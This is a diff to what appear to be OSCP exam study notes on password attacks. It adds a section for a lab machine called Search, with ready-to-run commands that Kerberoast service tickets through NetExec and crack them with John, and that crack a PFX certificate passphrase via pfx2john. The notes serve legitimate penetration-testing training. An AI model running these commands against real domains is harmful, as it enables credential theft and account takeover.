@@ -213,6 +213,32 @@ Each tool solves a different abstraction problem. The OS needs a block device (l
 🔁 [[16. Password Attacks|PA.4]]
 
 #### Tags: #CommandBreakdowns #PasswordAttacks #Hydra #Mimikatz #memssp #NetNTLMv2 #PowerShell #UNCInjection #CredentialGuard #Hashcat #MaskAttack #BitLocker #losetup #dislocker
+## Search: TGS and PFX cracking are offline attacks
+
+### Kerberoast TGS
+
+The NetExec LDAP module requests a service ticket for an SPN and writes the captured response to a file. John then tests guesses locally. The network operation and password-recovery operation are separate:
+
+~~~bash
+netexec ldap $BoxIP -u $Username -p $Password \
+  --kerberoasting $BoxDir/loot/kerberoast.txt
+john $BoxDir/loot/kerberoast.txt \
+  --wordlist=/usr/share/wordlists/rockyou.txt
+~~~
+
+### PKCS#12 PFX
+
+The same evidence-first pattern applies to the certificate container:
+
+~~~bash
+pfx2john $BoxDir/loot/staff.pfx > $BoxDir/loot/staff.pfx.hash
+john $BoxDir/loot/staff.pfx.hash \
+  --wordlist=/usr/share/wordlists/rockyou.txt
+john $BoxDir/loot/staff.pfx.hash --show
+~~~
+
+PFX is not a Windows NTLM hash and cannot be passed to a normal SMB credential option. Recover its passphrase offline, inspect the certificate identity, then use it as a client certificate with the correct format flag. See [[OSCP/BOXES/WRITE UPS/AD/Search|Search]].
+
 ## External Resources
 
 - [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
